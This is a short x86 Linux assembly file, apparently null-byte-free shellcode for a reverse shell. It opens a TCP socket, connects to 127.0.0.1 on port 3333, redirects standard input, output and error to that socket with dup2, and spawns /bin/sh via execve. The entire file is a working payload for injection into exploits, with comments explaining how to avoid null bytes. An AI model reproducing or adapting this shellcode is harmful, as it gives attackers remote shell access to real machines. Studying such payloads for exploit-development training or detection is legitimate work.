section .text
	global _start

_start:
; Setting up the socket
	xor ebx, ebx				; set the register ebx to 0
	mul ebx					; The result of the multiplication is stocked in eax and ebx
	
	mov al, 0x66				; syscall of socket_call in hexa
	mov bl, 0x01				; first parameter, here 1 is assigned (SYS_SOCKET)
	
	push edx				; push 0 on the stack for tcp 
	push ebx				; push the first arg, 1 (SYS_SOCKET)
	push 0x2				; push 2 for ipv4 
	
	mov ecx, esp	
	int 80h					; syscall
	mov edi, eax				; save the file descriptor in edi
	
	
; Connection
	xor ebx, ebx
	mul ebx
	
	mov al, 0x66
	mov bl, 0x03				; first parameter, here 3 is assigned (SYS_CONNECT)
		
	mov ecx, ~0x0100007F			; invert the ip address for NULL byte free
	not ecx					; put back the ip address
	push ecx				; push the ip address 
	push word 0x050D			; set the litsen port, here 3333
	push word 0x02				; push 2 for ipv4
	
	mov ecx, esp				; keep first arg address in ecx
	push byte 0x10				; push the ip address length
	push ecx
	push edi				; push file descriptor saved before
	mov ecx, esp				; reassign all the arg in ecx
	int 80h					; syscall
	
	
; Redrect the flow with dup2
	pop ebx					; moving the file descriptor from the stack
	xor eax, eax				; set eax to 0
	xor ecx, ecx				; clear ecx before the loop
	mov cl, 0x2				; loop counter
	
	
loop:
	mov al, 0x3F				; hex syscall of dup2
	int 80h					; syscall
	dec ecx					; the argument for the file descriptor
	jns loop
	

; Exec /bin/sh via execve
	xor ebx, ebx
	mul ebx
	
	push edx				; push nullbyte to the stack
	push 0x68732f2f 
	push 0x6e69622f
	
	mov ebx, esp
	mov ecx, edx
	
	mov al, 0xB
	int 80h
	
	
	
